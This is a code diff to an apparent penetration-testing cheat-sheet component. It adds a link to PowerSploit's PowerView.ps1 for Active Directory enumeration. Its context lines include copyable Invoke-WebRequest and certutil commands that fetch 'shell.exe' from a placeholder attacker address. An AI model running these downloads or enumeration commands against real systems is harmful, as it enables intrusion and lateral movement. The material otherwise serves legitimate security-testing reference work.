@@ -22,7 +22,12 @@ export default function PowershellCommands() {
 	// windows wget like
 	const powershell_http_dl = 'Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
 	const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe';
-
+	
+	
+	
+	// require powerview 
+	const power_view_repo:string = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1';
+	
 	// domain enum
 	const domain_name = `Get-NetDomain`;
 	const forest_domain_list = `Get-NetForestDomain`;
@@ -116,7 +121,10 @@ export default function PowershellCommands() {
 				}}
 			>
 				<Title level={2}>Active Directory enumeration</Title>
-
+				<Paragraph>Require Powerview.ps1</Paragraph>
+				<Paragraph copyable ellipsis={true}>
+					{power_view_repo}
+				</Paragraph>
 				<Title level={4}>Domain enumeration</Title>
 
 				<Paragraph copyable ellipsis={true}>
